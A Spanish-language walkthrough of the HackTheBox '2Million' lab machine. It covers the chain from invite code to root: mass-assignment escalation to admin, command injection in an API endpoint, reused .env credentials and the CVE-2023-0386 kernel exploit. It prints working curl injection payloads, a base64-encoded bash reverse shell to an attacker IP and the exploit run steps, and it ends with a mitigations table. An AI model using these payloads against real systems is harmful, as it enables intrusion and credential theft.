@@ -1,0 +1,226 @@
+---
+title: "2Million"
+platform: "HackTheBox"
+os: "Linux"
+difficulty: "Easy"
+date: 2026-11-04
+ports: ["22/ssh", "80/http"]
+tags: ["web", "api-abuse", "broken-access-control", "command-injection", "password-reuse", "kernel-exploit", "cve-2023-0386"]
+summary: "Homenaje de HTB a sus 2 millones de usuarios: recrea el clásico reto del invite code. Cadena completa de web/API: generación del código de invitación (JS → ROT13 → base64), escalada a admin por mass assignment (is_admin), RCE por command injection en la generación de VPN, credenciales filtradas en un .env reutilizadas para SSH, y root vía CVE-2023-0386 (OverlayFS/FUSE)."
+---
+
+**2Million** es una máquina *easy* de Linux publicada para celebrar que HackTheBox alcanzó los **2 millones de usuarios registrados**. Recrea la web antigua de la plataforma y, sobre todo, el mítico **invite code challenge**: durante años la única forma de registrarse en HTB era *hackear* un código de invitación.
+
+La cadena de explotación encadena fallos muy habituales en aplicaciones web reales:
+
+<AttackChain
+  label="Cadena de ataque · del invite code a root"
+  steps={[
+    { title: 'Invite code', desc: 'El JS del cliente genera el código con un POST oculto + ROT13 + base64. Se replica para registrarse.', action: 'registro y login' },
+    { title: 'Admin · mass assignment', desc: 'El endpoint de settings acepta is_admin desde el input del usuario → auto-promoción a administrador.', action: 'endpoints de admin' },
+    { title: 'RCE · www-data', desc: 'Command injection en admin/vpn/generate: el parámetro username se concatena a una llamada a shell.', action: 'leer el .env del web root' },
+    { title: 'Credenciales en .env', desc: 'La contraseña de la base de datos está hardcodeada en /var/www/html/.env.', action: 'reutilización de contraseña' },
+    { title: 'admin (SSH) · user', desc: 'La contraseña de la BD abre SSH como el usuario admin → user.txt.', action: 'kernel desactualizado (OverlayFS)' },
+    { title: 'root · CVE-2023-0386', desc: 'Exploit de OverlayFS/FUSE → ejecutable setuid root → shell con uid 0.', tone: 'win' },
+  ]}
+/>
+
+<Callout type="note">
+Pese a ser *easy*, toca web, abuso de API, control de acceso roto, RCE, movimiento lateral y exploit de kernel. Una de las boxes más completas para iniciarse.
+</Callout>
+
+## Reconocimiento
+
+Añadimos el host al `/etc/hosts`:
+
+```bash
+echo "10.10.11.x  2million.htb" | sudo tee -a /etc/hosts
+```
+
+El escaneo revela los servicios típicos:
+
+```bash
+nmap -sC -sV -oA nmap/2million 2million.htb
+```
+
+- **22/tcp** — OpenSSH
+- **80/tcp** — nginx (la web de HTB "retro")
+
+La página principal invita a registrarse, pero el registro es **solo por invitación** (`/invite`).
+
+### Generación del invite code
+
+La página `/invite` carga un JS minificado. Lo embellecemos para leerlo:
+
+```bash
+curl -s http://2million.htb/js/inviteapi.min.js | js-beautify
+```
+
+Aparecen dos funciones reveladoras: `verifyInviteCode()` (POST a `/api/v1/invite/verify`) y `makeInviteCode()`, que hace un **POST** a `/api/v1/invite/how/to/generate`.
+
+<Callout type="tip">
+Detalle clave: el endpoint solo responde a **POST**. Un `curl` por defecto usa GET, y entonces parece que la ruta "no existe". Ante un 404/405/vacío en una API, prueba otros verbos (`OPTIONS` revela los permitidos en la cabecera `Allow`).
+</Callout>
+
+```bash
+curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate
+```
+
+La respuesta viene codificada en **ROT13** (lo indica el propio JSON). La desciframos:
+
+```bash
+echo "Va beqre gb trarengr..." | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+# -> In order to generate the invite code, make a POST request to /api/v1/invite/generate
+```
+
+Pedimos el código real, que llega en **base64**, y lo decodificamos:
+
+```bash
+curl -s -X POST http://2million.htb/api/v1/invite/generate \
+  | jq -r '.data.code' | base64 -d
+# -> XXXXX-XXXXX-XXXXX-XXXXX
+```
+
+Con ese código ya podemos registrarnos y hacer login.
+
+## Foothold
+
+### Enumeración de la API
+
+Autenticados, la API expone su propio índice de rutas:
+
+```bash
+curl -s http://2million.htb/api/v1 -b "PHPSESSID=<SESSION>" | jq
+```
+
+Entre las rutas destaca una sección `admin`:
+
+| Método | Ruta | Descripción |
+|--------|------|-------------|
+| GET | `/api/v1/admin/auth` | Comprueba si eres admin |
+| POST | `/api/v1/admin/vpn/generate` | Genera VPN para un usuario |
+| PUT | `/api/v1/admin/settings/update` | Actualiza ajustes de usuario |
+
+### Escalada a admin (Mass Assignment)
+
+Comprobamos que **no** somos admin y atacamos el endpoint de settings. Dejando que los errores verbosos nos guíen (*"Missing parameter: email"*, luego *"Missing parameter: is_admin"*), descubrimos los campos esperados. El campo `is_admin` jamás debería ser modificable desde el input del usuario:
+
+```bash
+curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
+  -b "PHPSESSID=<SESSION>" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"<TU_EMAIL>","is_admin":1}'
+```
+
+Confirmamos la promoción:
+
+```bash
+curl -s http://2million.htb/api/v1/admin/auth -b "PHPSESSID=<SESSION>"
+# {"message":true}
+```
+
+<Callout type="warning">
+Esto es **escalada de privilegios vertical** (severidad crítica). La raíz es la ausencia de una *allow-list* de campos actualizables: el backend vuelca el JSON de entrada contra el modelo sin filtrar claves sensibles como `is_admin`.
+</Callout>
+
+### RCE por Command Injection
+
+El endpoint `admin/vpn/generate` concatena el parámetro `username` en una llamada a shell sin sanear. Confirmamos ejecución con un comando inofensivo:
+
+```bash
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -b "PHPSESSID=<SESSION>" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test;id;"}'
+# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+<Callout type="tip">
+El **punto y coma de cierre** (`;id;`) es importante: termina el comando inyectado antes de que se le concatene el resto del comando original. Alternativa robusta: command substitution `test$(id)`, que se resuelve inline sin depender de lo que haya alrededor.
+</Callout>
+
+Para una shell interactiva, enviamos una reverse shell **codificada en base64** (evita que los caracteres especiales rompan el JSON):
+
+```bash
+# En Kali
+nc -lvnp 4444
+echo -n 'bash -i >& /dev/tcp/<TU_IP>/4444 0>&1' | base64
+
+# Inyección
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  -b "PHPSESSID=<SESSION>" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test;echo <BASE64> | base64 -d | bash;"}'
+```
+
+### Credenciales en el .env
+
+Como `www-data`, el fichero `.env` del web root expone las credenciales de base de datos:
+
+```bash
+cat /var/www/html/.env
+# DB_USERNAME=admin
+# DB_PASSWORD=************
+```
+
+<Callout type="note">
+No hace falta reverse shell para esto: `cat /var/www/html/.env` se puede ejecutar directamente vía la inyección. En un pentest real se prefiere esa vía (lectura puntual) por ser menos intrusiva que mantener una shell interactiva.
+</Callout>
+
+### SSH como admin (Password Reuse)
+
+La contraseña de la base de datos está **reutilizada** para el usuario del sistema `admin`:
+
+```bash
+ssh admin@2million.htb
+cat ~/user.txt   # user flag capturada
+```
+
+## Escalada de privilegios
+
+Al entrar por SSH, el MOTD avisa de **"You have mail"**. En `/var/mail/admin` hay un correo de `ch4p` (fundador de HTB) que pide parchear el sistema por unas CVEs de kernel, mencionando explícitamente **OverlayFS / FUSE**. La pista apunta a **CVE-2023-0386**.
+
+Verificamos el kernel:
+
+```bash
+uname -r   # kernel en el rango vulnerable
+```
+
+Descargamos, **compilamos en la propia máquina** (para enlazar contra sus librerías) y ejecutamos el PoC, que requiere dos procesos simultáneos:
+
+```bash
+# PoC: github.com/xkaneiki/CVE-2023-0386
+make all
+
+# Terminal 1
+./fuse ./ovlcap/lower ./gc
+# Terminal 2
+./exp
+```
+
+El segundo proceso devuelve una shell con `uid=0(root)`:
+
+```bash
+id            # uid=0(root)
+cat /root/root.txt   # root flag capturada
+```
+
+<Callout type="warning">
+**CVE-2023-0386**: fallo en el *copy-up* de OverlayFS que no validaba correctamente las capabilities/setuid de los ficheros. Combinado con un FUSE controlado por el usuario, permite obtener un ejecutable setuid root. Los exploits de kernel son de los vectores más arriesgados (pueden provocar kernel panic): en un entorno real requieren aprobación explícita y una red de seguridad para reiniciar.
+</Callout>
+
+<Callout type="note">
+Easter egg: en `/root/` hay un `thank_you.json` con un mensaje de agradecimiento de HTB cifrado en capas (URL → hex → base64 → XOR con clave `HackTheBox`). Buen ejercicio de "stacked encoding", la misma técnica que se ve ofuscando payloads de malware.
+</Callout>
+
+## Lecciones y mitigaciones
+
+| Vulnerabilidad | Causa | Mitigación |
+|----------------|-------|------------|
+| Invite code adivinable | Lógica sensible expuesta en el cliente (JS) y codificaciones triviales | Mover la generación a server-side con tokens firmados de un solo uso |
+| Broken Access Control / Mass Assignment | El endpoint acepta `is_admin` desde el input | Allow-list estricta de campos; separar DTO de entrada del modelo de persistencia |
+| OS Command Injection | `username` concatenado en una llamada a shell | No construir comandos con strings; usar APIs con argumentos separados y escapado |
+| Verbose error messages | Errores que revelan parámetros esperados | Mensajes genéricos en producción |
+| Hardcoded credentials | Credenciales de BD en `.env` legible por el web server | Gestor de secretos; permisos restrictivos; fuera del web root |
+| Password reuse | Misma contraseña para BD y SSH | Contraseñas únicas por servicio + rotación |
+| CVE-2023-0386 | Kernel desactualizado (OverlayFS/FUSE) | Parcheado de kernel y gestión de vulnerabilidades |
